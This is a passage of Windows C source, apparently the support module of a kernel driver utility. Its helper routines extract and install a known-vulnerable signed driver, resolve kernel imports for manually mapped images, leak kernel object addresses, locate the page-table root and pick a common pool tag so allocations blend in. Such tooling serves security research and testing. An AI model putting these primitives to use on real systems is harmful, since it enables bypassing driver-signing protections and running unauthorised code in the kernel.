            status = supOpenDriverEx(szDeviceLink,
                DesiredAccess,
                DeviceHandle);

        }

    }
    else {
        status = STATUS_INVALID_PARAMETER_1;
    }

    return status;
}

/*
* supGetSystemInfo
*
* Purpose:
*
* Wrapper for NtQuerySystemInformation.
*
*/
PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass
)
{
    return ntsupGetSystemInfoEx(
        SystemInformationClass,
        NULL,
        (PNTSUPMEMALLOC)supHeapAlloc,
        (PNTSUPMEMFREE)supHeapFree);
}

/*
* supGetLoadedModulesList
*
* Purpose:
*
* Read list of loaded kernel modules.
*
*/
PVOID supGetLoadedModulesList(
    _In_ BOOL ExtendedOutput,
    _Out_opt_ PULONG ReturnLength
)
{
    return ntsupGetLoadedModulesListEx(ExtendedOutput,
        ReturnLength,
        (PNTSUPMEMALLOC)supHeapAlloc,
        (PNTSUPMEMFREE)supHeapFree);
}

/*
* supGetNtOsBase
*
* Purpose:
*
* Return ntoskrnl base address.
*
*/
ULONG_PTR supGetNtOsBase(
    VOID
)
{
    PRTL_PROCESS_MODULES   miSpace;
    ULONG_PTR              NtOsBase = 0;

    miSpace = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
    if (miSpace) {
        NtOsBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
        supHeapFree(miSpace);
    }
    return NtOsBase;
}

/*
* supGetProcAddress
*
* Purpose:
*
* Get NtOskrnl procedure address.
*
*/
ULONG_PTR supGetProcAddress(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR FunctionName
)
{
    ANSI_STRING cStr;
    ULONG_PTR   pfn = 0;

    RtlInitString(&cStr, FunctionName);
    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
        return 0;

    return KernelBase + (pfn - KernelImage);
}

/*
* supResolveKernelImport
*
* Purpose:
*
* Resolve import (ntoskrnl only).
*
*/
VOID supResolveKernelImport(
    _In_ ULONG_PTR Image,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    PIMAGE_OPTIONAL_HEADER      popth;
    ULONG_PTR                   ITableVA, * nextthunk;
    PIMAGE_IMPORT_DESCRIPTOR    ITable;
    PIMAGE_THUNK_DATA           pthunk;
    PIMAGE_IMPORT_BY_NAME       pname;
    ULONG                       i;

    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

    if (popth->NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT)
        return;

    ITableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (ITableVA == 0)
        return;

    ITable = (PIMAGE_IMPORT_DESCRIPTOR)(Image + ITableVA);

    if (ITable->OriginalFirstThunk == 0)
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->FirstThunk);
    else
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->OriginalFirstThunk);

    for (i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
        nextthunk = (PULONG_PTR)(Image + ITable->FirstThunk);
        if ((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
            pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image + pthunk->u1.AddressOfData);
            nextthunk[i] = supGetProcAddress(KernelBase, KernelImage, pname->Name);
        }
        else
            nextthunk[i] = supGetProcAddress(KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
    }
}

/*
* supQueryObjectFromHandle
*
* Purpose:
*
* Return object kernel address from handle in current process handle table.
*
*/
BOOL supQueryObjectFromHandle(
    _In_ HANDLE hOject,
    _Out_ ULONG_PTR* Address
)
{
    BOOL   bFound = FALSE;
    ULONG  i;
    DWORD  CurrentProcessId = GetCurrentProcessId();

    PSYSTEM_HANDLE_INFORMATION_EX pHandles;

    if (Address)
        *Address = 0;
    else
        return FALSE;

    pHandles = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
    if (pHandles) {
        for (i = 0; i < pHandles->NumberOfHandles; i++) {
            if (pHandles->Handles[i].UniqueProcessId == CurrentProcessId) {
                if (pHandles->Handles[i].HandleValue == (ULONG_PTR)hOject) {
                    *Address = (ULONG_PTR)pHandles->Handles[i].Object;
                    bFound = TRUE;
                    break;
                }
            }
        }
        supHeapFree(pHandles);
    }
    return bFound;
}

/*
* supGetCommandLineOption
*
* Purpose:
*
* Parse command line options.
*
*/
BOOL supGetCommandLineOption(
    _In_ LPCTSTR OptionName,
    _In_ BOOL IsParametric,
    _Inout_opt_ LPTSTR OptionValue,
    _In_ ULONG ValueSize,
    _Out_opt_ PULONG ParamLength
)
{
    BOOL    bResult;
    LPTSTR  cmdline = GetCommandLine();
    TCHAR   Param[MAX_PATH + 1];
    ULONG   rlen;
    int     i = 0;

    if (ParamLength)
        *ParamLength = 0;

    RtlSecureZeroMemory(Param, sizeof(Param));
    while (GetCommandLineParam(cmdline, i, Param, MAX_PATH, &rlen))
    {
        if (rlen == 0)
            break;

        if (_strcmp(Param, OptionName) == 0)
        {
            if (IsParametric) {
                bResult = GetCommandLineParam(cmdline, i + 1, OptionValue, ValueSize, &rlen);
                if (ParamLength)
                    *ParamLength = rlen;
                return bResult;
            }

            return TRUE;
        }
        ++i;
    }

    return FALSE;
}

/*
* supQueryMaximumUserModeAddress
*
* Purpose:
*
* Return maximum user mode address.
*
*/
ULONG_PTR supQueryMaximumUserModeAddress()
{
    NTSTATUS ntStatus;

    SYSTEM_BASIC_INFORMATION basicInfo;

    ULONG returnLength = 0;
    SYSTEM_INFO systemInfo;

    RtlSecureZeroMemory(&basicInfo, sizeof(basicInfo));

    ntStatus = NtQuerySystemInformation(SystemBasicInformation,
        &basicInfo,
        sizeof(basicInfo),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {
        return basicInfo.MaximumUserModeAddress;
    }
    else {

        RtlSecureZeroMemory(&systemInfo, sizeof(systemInfo));
        GetSystemInfo(&systemInfo);
        return (ULONG_PTR)systemInfo.lpMaximumApplicationAddress;
    }

}

/*
* supQuerySecureBootState
*
* Purpose:
*
* Query Firmware type and SecureBoot state if firmware is EFI.
*
*/
BOOLEAN supQuerySecureBootState(
    _Out_ PBOOLEAN pbSecureBoot
)
{
    BOOLEAN bResult = FALSE;
    BOOLEAN bSecureBoot = FALSE;

    if (pbSecureBoot)
        *pbSecureBoot = FALSE;

    if (NT_SUCCESS(supEnablePrivilege(SE_SYSTEM_ENVIRONMENT_PRIVILEGE, TRUE))) {

        bSecureBoot = FALSE;

        GetFirmwareEnvironmentVariable(
            L"SecureBoot",
            L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
            &bSecureBoot,
            sizeof(BOOLEAN));

        supEnablePrivilege(SE_SYSTEM_ENVIRONMENT_PRIVILEGE, FALSE);

        if (pbSecureBoot) {
            *pbSecureBoot = bSecureBoot;
        }
        bResult = TRUE;
    }
    return bResult;
}

/*
* supGetFirmwareType
*
* Purpose:
*
* Return firmware type.
*
*/
NTSTATUS supGetFirmwareType(
    _Out_ PFIRMWARE_TYPE FirmwareType
)
{
    NTSTATUS ntStatus;
    ULONG returnLength = 0;
    SYSTEM_BOOT_ENVIRONMENT_INFORMATION sbei;

    *FirmwareType = FirmwareTypeUnknown;

    RtlSecureZeroMemory(&sbei, sizeof(sbei));

    ntStatus = NtQuerySystemInformation(SystemBootEnvironmentInformation,
        &sbei,
        sizeof(sbei),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {
        *FirmwareType = sbei.FirmwareType;

    }

    return ntStatus;
}

/*
* supReadFileToBuffer
*
* Purpose:
*
* Read file to buffer. Release memory when it no longer needed.
*
*/
PBYTE supReadFileToBuffer(
    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize
)
{
    NTSTATUS    status;
    HANDLE      hFile = NULL;
    PBYTE       Buffer = NULL;
    SIZE_T      sz = 0;

    UNICODE_STRING              usName;
    OBJECT_ATTRIBUTES           attr;
    IO_STATUS_BLOCK             iost;
    FILE_STANDARD_INFORMATION   fi;

    if (lpFileName == NULL)
        return NULL;

    usName.Buffer = NULL;

    do {

        if (!RtlDosPathNameToNtPathName_U(lpFileName, &usName, NULL, NULL))
            break;

        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtCreateFile(
            &hFile,
            FILE_READ_DATA | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlSecureZeroMemory(&fi, sizeof(fi));

        status = NtQueryInformationFile(
            hFile,
            &iost,
            &fi,
            sizeof(FILE_STANDARD_INFORMATION),
            FileStandardInformation);

        if (!NT_SUCCESS(status))
            break;

        sz = (SIZE_T)fi.EndOfFile.LowPart;

        Buffer = (PBYTE)supHeapAlloc(sz);
        if (Buffer) {

            status = NtReadFile(
                hFile,
                NULL,
                NULL,
                NULL,
                &iost,
                Buffer,
                fi.EndOfFile.LowPart,
                NULL,
                NULL);

            if (NT_SUCCESS(status)) {
                if (lpBufferSize)
                    *lpBufferSize = fi.EndOfFile.LowPart;
            }
            else {
                supHeapFree(Buffer);
                Buffer = NULL;
            }
        }

    } while (FALSE);

    if (hFile != NULL) {
        NtClose(hFile);
    }

    if (usName.Buffer)
        RtlFreeUnicodeString(&usName);

    return Buffer;
}

/*
* supGetPML4FromLowStub1M
*
* Purpose:
*
* Search for PML4 (CR3) entry in low stub.
*
* Taken from MemProcFs, https://github.com/ufrisk/MemProcFS/blob/master/vmm/vmmwininit.c#L414
*
*/
ULONG_PTR supGetPML4FromLowStub1M(
    _In_ ULONG_PTR pbLowStub1M)
{
    ULONG offset = 0;
    ULONG_PTR PML4 = 0;
    ULONG cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) +
        FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);

    SetLastError(ERROR_EXCEPTION_IN_SERVICE);

    __try {

        while (offset < 0x100000) {

            offset += 0x1000;

            if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(pbLowStub1M + offset))) //PROCESSOR_START_BLOCK->Jmp
                continue;

            if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(pbLowStub1M + offset + FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget))))
                continue;

            if (0xffffff0000000fff & *(UINT64*)(pbLowStub1M + offset + cr3_offset))
                continue;

            PML4 = *(UINT64*)(pbLowStub1M + offset + cr3_offset);
            break;
        }

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }

    SetLastError(ERROR_SUCCESS);

    return PML4;
}

/*
* supCreateSystemAdminAccessSD
*
* Purpose:
*
* Create security descriptor with Admin/System ACL set.
*
*/
NTSTATUS supCreateSystemAdminAccessSD(
    _Out_ PSECURITY_DESCRIPTOR * SecurityDescriptor,
    _Out_ PACL * DefaultAcl
)
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    ULONG aclSize = 0;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PACL pAcl = NULL;
    PSECURITY_DESCRIPTOR securityDescriptor = NULL;

    UCHAR sidBuffer[2 * sizeof(SID)];

    *SecurityDescriptor = NULL;
    *DefaultAcl = NULL;

    do {

        RtlSecureZeroMemory(sidBuffer, sizeof(sidBuffer));

        securityDescriptor = (PSECURITY_DESCRIPTOR)supHeapAlloc(sizeof(SECURITY_DESCRIPTOR));
        if (securityDescriptor == NULL) {
            ntStatus = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        aclSize += RtlLengthRequiredSid(1); //LocalSystem sid
        aclSize += RtlLengthRequiredSid(2); //Admin group sid
        aclSize += sizeof(ACL);
        aclSize += 2 * (sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG));

        pAcl = (PACL)supHeapAlloc(aclSize);
        if (pAcl == NULL) {
            ntStatus = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        ntStatus = RtlCreateAcl(pAcl, aclSize, ACL_REVISION);
        if (!NT_SUCCESS(ntStatus))
            break;

        //
        // Local System - Generic All.
        //
        RtlInitializeSid(sidBuffer, &ntAuthority, 1);
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_LOCAL_SYSTEM_RID;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, (PSID)sidBuffer);

        //
        // Admins - Generic All.
        //
        RtlInitializeSid(sidBuffer, &ntAuthority, 2);
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_BUILTIN_DOMAIN_RID;
        *(RtlSubAuthoritySid(sidBuffer, 1)) = DOMAIN_ALIAS_RID_ADMINS;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, (PSID)sidBuffer);

        ntStatus = RtlCreateSecurityDescriptor(securityDescriptor,
            SECURITY_DESCRIPTOR_REVISION1);
        if (!NT_SUCCESS(ntStatus))
            break;

        ntStatus = RtlSetDaclSecurityDescriptor(securityDescriptor,
            TRUE,
            pAcl,
            FALSE);

        if (!NT_SUCCESS(ntStatus))
            break;

        *SecurityDescriptor = securityDescriptor;
        *DefaultAcl = pAcl;

    } while (FALSE);

    if (!NT_SUCCESS(ntStatus)) {

        if (pAcl) supHeapFree(pAcl);

        if (securityDescriptor) {
            supHeapFree(securityDescriptor);
        }

        *SecurityDescriptor = NULL;
        *DefaultAcl = NULL;
    }

    return ntStatus;
}

/*
* supGetTimeAsSecondsSince1970
*
* Purpose:
*
* Return seconds since 1970.
*
*/
ULONG supGetTimeAsSecondsSince1970()
{
    LARGE_INTEGER fileTime;
    ULONG seconds = 0;

    GetSystemTimeAsFileTime((PFILETIME)&fileTime);
    RtlTimeToSecondsSince1970(&fileTime, &seconds);
    return seconds;
}

/*
* supGetModuleBaseByName
*
* Purpose:
*
* Return module base address.
*
*/
ULONG_PTR supGetModuleBaseByName(
    _In_ LPCWSTR ModuleName,
    _Out_opt_ PULONG ImageSize
)
{
    ULONG_PTR ReturnAddress = 0;
    ULONG i, k;
    PRTL_PROCESS_MODULES miSpace;

    ANSI_STRING moduleName;

    if (ImageSize)
        *ImageSize = 0;

    moduleName.Buffer = NULL;
    moduleName.Length = moduleName.MaximumLength = 0;

    if (!NT_SUCCESS(supConvertToAnsi(ModuleName, &moduleName)))
        return 0;

    miSpace = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
    if (miSpace != NULL) {

        for (i = 0; i < miSpace->NumberOfModules; i++) {

            k = miSpace->Modules[i].OffsetToFileName;
            if (_strcmpi_a(
                (CONST CHAR*) & miSpace->Modules[i].FullPathName[k],
                moduleName.Buffer) == 0)
            {
                ReturnAddress = (ULONG_PTR)miSpace->Modules[i].ImageBase;
                if (ImageSize)
                    *ImageSize = miSpace->Modules[i].ImageSize;
                break;
            }

        }

        supHeapFree(miSpace);

    }

    RtlFreeAnsiString(&moduleName);

    return ReturnAddress;
}

/*
* supManageDummyDll
*
* Purpose:
*
* Drop dummy dll to the %temp% and load it to trigger ImageLoad notify callbacks.
* If fRemove set to TRUE then remove previously dropped file and return result of operation.
*
*/
BOOL supManageDummyDll(
    _In_ LPCWSTR lpDllName,
    _In_ BOOLEAN fRemove
)
{
    BOOL bResult = FALSE;
    ULONG dataSize = 0;
    PBYTE dataBuffer;
    PVOID dllHandle;

    LPWSTR lpFileName;
    SIZE_T Length = (1024 + _strlen(lpDllName)) * sizeof(WCHAR);

    //
    // Allocate space for filename.
    //
    lpFileName = (LPWSTR)supHeapAlloc(Length);
    if (lpFileName == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    if (fRemove) {

        HMODULE hModule = GetModuleHandle(lpDllName);

        if (hModule) {

            if (GetModuleFileName(hModule, lpFileName, MAX_PATH)) {
                FreeLibrary(hModule);
                bResult = DeleteFile(lpFileName);
            }

        }

    }
    else {

        DWORD cch = supExpandEnvironmentStrings(L"%temp%\\", lpFileName, MAX_PATH);
        if (cch == 0 || cch > MAX_PATH) {
            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        }
        else {

            //
            // Extract file from resource and drop to the disk in %temp% directory.
            //
            dllHandle = (PVOID)GetModuleHandle(NULL);

            dataBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI64,
                dllHandle,
                &dataSize,
                PROVIDER_RES_KEY,
                TRUE);

            if (dataBuffer) {

                _strcat(lpFileName, lpDllName);
                if (dataSize == supWriteBufferToFile(lpFileName,
                    dataBuffer,
                    dataSize,
                    TRUE,
                    FALSE,
                    NULL))
                {
                    //
                    // Finally load file and trigger image notify callbacks.
                    //
                    if (LoadLibraryEx(lpFileName, NULL, 0))
                        bResult = TRUE;
                }

                supHeapFree(dataBuffer);
            }
            else {
                SetLastError(ERROR_FILE_INVALID);
            }

        }
    }

    supHeapFree(lpFileName);

    return bResult;
}

/*
* supSelectNonPagedPoolTag
*
* Purpose:
*
* Query most used nonpaged pool tag.
*
*/
ULONG supSelectNonPagedPoolTag(
    VOID
)
{
    ULONG ulResult = SHELL_POOL_TAG;
    PSYSTEM_POOLTAG_INFORMATION pvPoolInfo;

    pvPoolInfo = (PSYSTEM_POOLTAG_INFORMATION)supGetSystemInfo(SystemPoolTagInformation);
    if (pvPoolInfo) {

        SIZE_T maxUse = 0;

        for (ULONG i = 0; i < pvPoolInfo->Count; i++) {

            if (pvPoolInfo->TagInfo[i].NonPagedUsed > maxUse) {
                maxUse = pvPoolInfo->TagInfo[i].NonPagedUsed;
                ulResult = pvPoolInfo->TagInfo[i].TagUlong;
            }

        }

        supHeapFree(pvPoolInfo);
    }

    return ulResult;
}

/*
* supLoadFileForMapping
*
* Purpose:
*
* Load input file for further driver mapping.
*
*/
NTSTATUS supLoadFileForMapping(
    _In_ LPCWSTR PayloadFileName,
    _Out_ PVOID * LoadBase
)
{
    NTSTATUS ntStatus;
    ULONG dllCharacteristics = IMAGE_FILE_EXECUTABLE_IMAGE;
    UNICODE_STRING usFileName;

    PVOID pvImage = NULL;
    PIMAGE_NT_HEADERS pNtHeaders;

    *LoadBase = NULL;

    //
    // Map input file as image.
    //
    RtlInitUnicodeString(&usFileName, PayloadFileName);
    ntStatus = LdrLoadDll(NULL, &dllCharacteristics, &usFileName, &pvImage);
    if ((!NT_SUCCESS(ntStatus)) || (pvImage == NULL)) {
        return ntStatus;
    }

    pNtHeaders = RtlImageNtHeader(pvImage);
    if (pNtHeaders == NULL) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    *LoadBase = pvImage;

    return STATUS_SUCCESS;
}

/*
* supPrintfEvent
*
* Purpose:
*
* Wrapper for printf_s for displaying specific events.
*
*/
VOID supPrintfEvent(
    _In_ KDU_EVENT_TYPE Event,
    _Printf_format_string_ LPCSTR Format,
    ...
)
{
    HANDLE stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO screenBufferInfo;
    WORD origColor = FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_GREEN, newColor;
    va_list args;

    //
    // Rememeber original text color.
    //
    if (GetConsoleScreenBufferInfo(stdHandle, &screenBufferInfo)) {
        origColor = *(&screenBufferInfo.wAttributes);
    }

    switch (Event) {
    case kduEventInformation:
        newColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
        break;
    case kduEventError:
        newColor = FOREGROUND_RED | FOREGROUND_INTENSITY;
        break;
    default:
        newColor = FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_GREEN;
        break;
    }

    SetConsoleTextAttribute(stdHandle, newColor);

    //
    // Printf message.
    //
    va_start(args, Format);
    vprintf_s(Format, args);
    va_end(args);

    //
    // Restore original text color.
    //
    SetConsoleTextAttribute(stdHandle, origColor);
}

/*
* supQueryImageSize
*
* Purpose:
*
* Get image size from PEB loader list.
*
*/
NTSTATUS supQueryImageSize(
    _In_ PVOID ImageBase,
    _Out_ PSIZE_T ImageSize
)
{
    NTSTATUS ntStatus;
    LDR_DATA_TABLE_ENTRY* ldrEntry = NULL;

    *ImageSize = 0;

    ntStatus = LdrFindEntryForAddress(
        ImageBase,
        &ldrEntry);

    if (NT_SUCCESS(ntStatus)) {

        *ImageSize = ldrEntry->SizeOfImage;

    }

    return ntStatus;
}

/*
* supxBinTextEncode
*
* Purpose:
*
* Create pseudo random string from UI64 value.
*
*/
VOID supxBinTextEncode(
    _In_ unsigned __int64 x,
    _Inout_ wchar_t* s
)
{
    char    tbl[64];
    char    c = 0;
    int     p;

    tbl[62] = '-';
    tbl[63] = '_';

    for (c = 0; c < 26; ++c)
    {
        tbl[c] = 'A' + c;
        tbl[26 + c] = 'a' + c;
        if (c < 10)
            tbl[52 + c] = '0' + c;
    }

    for (p = 0; p < 13; ++p)
    {
        c = x & 0x3f;
        x >>= 5;
        *s = (wchar_t)tbl[c];
        ++s;
    }

    *s = 0;
}

/*
* supGenRandom
*
* Purpose:
*
* Generate pseudo-random value via CNG.
*
*/
BOOL supGenRandom(
    _Inout_ PBYTE pbBuffer,
    _In_ DWORD cbBuffer
)
{
    BOOL bResult = FALSE;
    BCRYPT_ALG_HANDLE hAlgRng = NULL;

    do {

        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlgRng,
            BCRYPT_RNG_ALGORITHM,
            NULL,
            0)))
        {
            break;
        }

        bResult = (NT_SUCCESS(BCryptGenRandom(
            hAlgRng,
            pbBuffer,
            cbBuffer,
            0)));

    } while (FALSE);

    if (hAlgRng)
        BCryptCloseAlgorithmProvider(hAlgRng, 0);

    return bResult;
}

/*
* supGenerateSharedObjectName
*
* Purpose:
*
* Create pseudo random object name from it ID.
*
*/
VOID supGenerateSharedObjectName(
    _In_ WORD ObjectId,
    _Inout_ LPWSTR lpBuffer
)
{
    ULARGE_INTEGER value;
    PIMAGE_NT_HEADERS ntHeaders = RtlImageNtHeader(NtCurrentPeb()->ImageBaseAddress);

    value.LowPart = MAKELONG(
        MAKEWORD(KDU_VERSION_BUILD, KDU_VERSION_REVISION),
        MAKEWORD(KDU_VERSION_MINOR, KDU_VERSION_MAJOR));

    value.HighPart = MAKELONG(ntHeaders->OptionalHeader.CheckSum, ObjectId);

    supxBinTextEncode(value.QuadPart, lpBuffer);
}

/*
* supxSetupInstallDriverFromInf
*
* Purpose:
*
* Install and load device driver through SetupAPI.
*
*/
BOOL supxSetupInstallDriverFromInf(
    _In_ LPCWSTR InfName,
    _In_ BYTE* HardwareId,
    _In_ ULONG HardwareIdLength,
    _Out_ HDEVINFO* DeviceInfo,
    _Inout_ SP_DEVINFO_DATA* DeviceInfoData,
    _In_ ULONG InstallFlags
)
{
    BOOL bResult = FALSE;
    GUID classGUID;
    HDEVINFO devInfoSet = NULL;
    WCHAR className[MAX_CLASS_NAME_LEN];

    *DeviceInfo = NULL;

    do {

        RtlSecureZeroMemory(&className, sizeof(className));

        //
        // Use the INF file to extract the class GUID.
        //
        if (!SetupDiGetINFClass(
            InfName,
            &classGUID,
            (PWSTR)&className,
            MAX_CLASS_NAME_LEN,
            NULL))
        {
            break;
        }

        //
        // Create the container for class GUID.
        //
        devInfoSet = SetupDiCreateDeviceInfoList(&classGUID, NULL);
        if (devInfoSet == INVALID_HANDLE_VALUE)
            break;

        DeviceInfoData->cbSize = sizeof(SP_DEVINFO_DATA);

        //
        // Create the element.
        //
        if (!SetupDiCreateDeviceInfo(devInfoSet,
            className,
            &classGUID,
            NULL,
            NULL,
            DICD_GENERATE_ID,
            DeviceInfoData))
        {
            break;
        }

        //
        // Add the HardwareID to the Device's HardwareID property.
        //
        if (!SetupDiSetDeviceRegistryProperty(devInfoSet,
            DeviceInfoData,
            SPDRP_HARDWAREID,
            HardwareId,
            HardwareIdLength))
        {
            break;
        }

        //
        // Transform the registry element into an actual devnode in the PnP HW tree.
        //
        if (!SetupDiCallClassInstaller(DIF_REGISTERDEVICE,
            devInfoSet,
            DeviceInfoData))
        {
            break;
        }

        bResult = UpdateDriverForPlugAndPlayDevices(NULL,
            (LPCWSTR)HardwareId,
            InfName,
            InstallFlags,
            NULL);

    } while (FALSE);

    if (bResult) {
        *DeviceInfo = devInfoSet;
    }
    else {
        if (devInfoSet && devInfoSet != INVALID_HANDLE_VALUE)
            SetupDiDestroyDeviceInfoList(devInfoSet);
    }

    return bResult;
}

/*
* supSetupManageFsFilterDriverPackage
*
* Purpose:
*
* Drop or remove required driver package files from disk in the current process directory.
*
*/
BOOL supSetupManageFsFilterDriverPackage(
    _In_ PVOID Context,
    _In_ BOOLEAN DoInstall,
    _In_ PSUP_SETUP_DRVPKG DriverPackage
)
{
    BOOL bResult = FALSE;
    LPWSTR lpFileName;
    KDU_CONTEXT* context = (KDU_CONTEXT*)Context;

    PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    SIZE_T allocSize = 64 +
        _strlen(DriverPackage->InfFile) * sizeof(WCHAR) +
        CurrentDirectory->Length +
        sizeof(WCHAR);

    ULONG lastError = ERROR_SUCCESS;

    if (DoInstall) {

        //
        // Drop target driver.
        //
        if (!KDUProvExtractVulnerableDriver(context)) {
            SetLastError(ERROR_INTERNAL_ERROR);
            return FALSE;
        }
    }

    //
    // Drop inf file.
    //
    lpFileName = (LPWSTR)supHeapAlloc(allocSize);
    if (lpFileName) {

        StringCchPrintf(lpFileName, allocSize / sizeof(WCHAR), TEXT("%ws%ws"),
            CurrentDirectory->Buffer,
            DriverPackage->InfFile);

        if (supExtractFileFromDB(context->ModuleBase, lpFileName, DriverPackage->InfFileResourceId)) {

            WCHAR szCmd[MAX_PATH * 2];
            WCHAR szFileName[MAX_PATH * 2];

            StringCchPrintf(szCmd, ARRAYSIZE(szCmd),
                TEXT("%ws 132 %ws"),
                DoInstall ? TEXT("DefaultInstall") : TEXT("DefaultUninstall"),
                lpFileName);

#pragma warning(push)
#pragma warning(disable: 6387)
            InstallHinfSection(NULL, NULL, szCmd, 0);
#pragma warning(pop)

            //
            // Since it doesn't provide any way to check result we have to inspect changes ourself.
            //
            StringCchPrintf(szFileName, RTL_NUMBER_OF(szFileName), TEXT("%ws\\system32\\drivers\\%ws.sys"),
                USER_SHARED_DATA->NtSystemRoot,
                context->Provider->LoadData->DriverName);

            if (RtlDoesFileExists_U(szFileName)) {
                if (DoInstall)
                    bResult = TRUE;
                else
                    lastError = ERROR_FILE_EXISTS;
            }
            else {
                if (DoInstall)
                    lastError = ERROR_FILE_NOT_FOUND;
                else
                    bResult = TRUE;
            }

        }
        else {
            lastError = ERROR_FILE_NOT_FOUND;
        }
        supHeapFree(lpFileName);
    }
    else {
        lastError = ERROR_NOT_ENOUGH_MEMORY;
    }

    SetLastError(lastError);
    return bResult;
}

/*
* supSetupManagePnpDriverPackage
*
* Purpose:
*
* Drop or remove required driver package files from disk in the current process directory.
*
*/
BOOL supSetupManagePnpDriverPackage(
    _In_ PVOID Context,
    _In_ BOOLEAN DoInstall,
    _In_ PSUP_SETUP_DRVPKG DriverPackage
)
{
    BOOL bResult = FALSE;
    LPWSTR lpEnd;
    LPWSTR lpFileName;
    KDU_CONTEXT* context = (KDU_CONTEXT*)Context;

    PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
    SIZE_T allocSize = 64 +
        ((_strlen(DriverPackage->CatalogFile) + _strlen(DriverPackage->InfFile)) * sizeof(WCHAR)) +
        CurrentDirectory->Length +
        sizeof(WCHAR);

    ULONG length, lastError = ERROR_SUCCESS;

    if (DoInstall) {

        //
        // Drop target driver.
        //
        if (!KDUProvExtractVulnerableDriver(context)) {
            SetLastError(ERROR_INTERNAL_ERROR);
            return FALSE;
        }

        //
        // Drop cat and inf files.
        //
        lpFileName = (LPWSTR)supHeapAlloc(allocSize);
        if (lpFileName) {

            length = CurrentDirectory->Length / sizeof(WCHAR);

            //
            // Drop catalog file.
            //
            _strncpy(lpFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            lpEnd = _strcat(lpFileName, L"\\");
            _strcat(lpFileName, DriverPackage->CatalogFile);
            if (supExtractFileFromDB(context->ModuleBase, lpFileName, DriverPackage->CatalogFileResourceId)) {

                //
                // Drop inf file.
                //
                *lpEnd = 0;
                _strcat(lpFileName, DriverPackage->InfFile);

                if (supExtractFileFromDB(context->ModuleBase, lpFileName, DriverPackage->InfFileResourceId)) {

                    //
                    // Install driver package.
                    //
                    bResult = supxSetupInstallDriverFromInf(lpFileName,
                        DriverPackage->Hwid,
                        DriverPackage->HwidLength,
                        &DriverPackage->DeviceInfo,
                        &DriverPackage->DeviceInfoData,
                        DriverPackage->InstallFlags);

                    if (!bResult)
                        lastError = GetLastError();

                }
            }
            else {
                lastError = ERROR_FILE_NOT_FOUND;
            }

            supHeapFree(lpFileName);
        }
        else {
            lastError = ERROR_NOT_ENOUGH_MEMORY;
        }
    }
    else {

        lpFileName = (LPWSTR)supHeapAlloc(allocSize);
        if (lpFileName) {

            length = CurrentDirectory->Length / sizeof(WCHAR);

            _strncpy(lpFileName,
                length,
                CurrentDirectory->Buffer,
                length);

            lpEnd = _strcat(lpFileName, L"\\");
            _strcat(lpFileName, DriverPackage->CatalogFile);
            DeleteFile(lpFileName);

            *lpEnd = 0;

            _strcat(lpFileName, DriverPackage->InfFile);
            DeleteFile(lpFileName);

            supHeapFree(lpFileName);
            bResult = TRUE;
        }
        else {
